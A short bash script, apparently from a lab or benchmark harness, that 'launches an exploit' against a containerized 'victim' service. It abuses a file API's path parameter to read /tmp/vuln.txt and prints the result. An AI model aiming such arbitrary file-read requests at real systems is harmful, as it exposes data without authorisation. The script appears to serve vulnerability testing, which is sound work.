#!/bin/bash
echo "Launching exploit"

# Make the request to victim's API
curl -s "http://victim:5003/api/file?path=/tmp/vuln.txt" -o output.txt

# Check if the request was successful and file was retrieved
if [ $? -eq 0 ]; then
    # Check if the response contains "error"
    if ! grep -q "error" output.txt; then
        echo "Found file: $(cat output.txt)"
    else
        echo "Error in response: $(cat output.txt)"
        exit 1
    fi
else
    echo "[!] ERROR: Failed to connect to victim container"
    exit 1
fi